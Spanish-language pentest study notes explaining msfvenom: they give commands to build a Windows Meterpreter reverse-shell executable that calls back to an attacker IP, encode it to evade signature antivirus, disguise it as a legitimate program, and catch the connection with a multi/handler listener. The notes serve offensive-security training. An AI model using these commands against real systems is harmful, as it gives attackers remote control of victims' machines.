# Payloads

## Overview

Un **payload** es la parte de un exploit o de una cadena de entrega que se ejecuta en el objetivo después de ser lanzada. En los ataques del lado del cliente, el payload normalmente se entrega mediante un archivo o ejecutable malicioso que la víctima abre, y después se conecta de vuelta al atacante.

Los ataques del lado del cliente dependen de la **interacción humana** en lugar de una vulnerabilidad de servicio. Como el payload se almacena en disco, la detección por antivirus es un factor importante.

## Ataques del lado del cliente

Los ataques del lado del cliente suelen usar ingeniería social para lograr que el objetivo ejecute un archivo malicioso. Algunos ejemplos comunes son:

- Documentos maliciosos.
- Ejecutables portables.
- Instaladores falsos o droppers.

El objetivo es conseguir que el sistema víctima ejecute el payload y abra una conexión inversa hacia el atacante.

## Msfvenom

**Msfvenom** es una utilidad de línea de comandos usada para generar y codificar payloads de Metasploit para distintos sistemas operativos y plataformas web. Combina las antiguas herramientas `msfpayload` y `msfencode` en una sola.

Se usa habitualmente para generar payloads Meterpreter que se entregan a un sistema cliente. Una vez ejecutado el archivo, se conecta de vuelta al handler del payload y proporciona acceso remoto.

### Sintaxis común

```bash
msfvenom -p <payload> LHOST=<tu_ip> LPORT=<puerto> -f <formato> -o <archivo_salida>
```

### Ejemplo

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f exe -o payload.exe
```

### Explicación de los comandos

- `msfvenom` — genera el payload.
- `-p windows/meterpreter/reverse_tcp` — selecciona el tipo de payload.
- `LHOST=<tu_ip>` — define la IP del atacante, a la que volverá la conexión inversa.
- `LPORT=4444` — define el puerto en la máquina atacante.
- `-f exe` — genera el payload en formato ejecutable de Windows.
- `-o payload.exe` — guarda el payload en un archivo.

## Codificación de payloads

Como muchas soluciones antivirus detectan archivos maliciosos usando firmas, los payloads pueden codificarse para cambiar su apariencia y evadir la detección basada en firmas antiguas.

La codificación modifica el shellcode para cambiar la firma del payload sin romper su funcionamiento.

### Ejemplo

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
```

### Explicación de los comandos

- `-e x86/shikata_ga_nai` — selecciona el codificador.
- `-i 3` — aplica la codificación tres veces.
- `-f exe` — genera un ejecutable de Windows.
- `-o encoded_payload.exe` — guarda el payload codificado.

### Nota importante

La codificación es útil sobre todo contra antivirus antiguos basados en firmas. No garantiza evasión frente a defensas modernas.

## Shellcode

El **shellcode** es un pequeño fragmento de código usado como payload en explotación. Recibe ese nombre porque su objetivo suele ser proporcionar una shell de comandos en el sistema objetivo.

El shellcode es lo que realmente se ejecuta después de la explotación o de la entrega del payload.

## Inyección de payloads en ejecutables portables de Windows

Una técnica común en ataques del lado del cliente es inyectar un payload dentro de un archivo PE de Windows para que parezca legítimo, pero ejecute código malicioso al abrirse.

### Ejemplo

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f exe -o malicious.exe
```

Esto crea un ejecutable independiente de Windows que puede entregarse al objetivo.

### Opcional: añadir codificación

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o malicious.exe
```

Esto genera un ejecutable codificado que puede ayudar a evadir una detección antivirus simple.

## Handler del payload

Después de generar el payload, Metasploit debe estar escuchando la conexión entrante.

### Ejemplo de configuración del handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
run
```

### Explicación de los comandos

- `use exploit/multi/handler` — inicia un listener para el payload.
- `set PAYLOAD windows/meterpreter/reverse_tcp` — hace que el handler coincida con el payload generado.
- `set LHOST <tu_ip>` — define la IP del atacante.
- `set LPORT 4444` — define el puerto de escucha.
- `run` — inicia el listener y espera la conexión del objetivo.

## Por qué importa

Los payloads son la parte que da control al atacante después de la entrega y ejecución. En los ataques del lado del cliente, lo más importante es generar el payload, codificarlo si hace falta, entregarlo y capturar la conexión inversa con un handler.

## Idea clave

Msfvenom se usa para generar payloads, la codificación puede ayudar frente a antivirus básicos, y se necesita un `multi/handler` para recibir la conexión cuando el payload se ejecute.
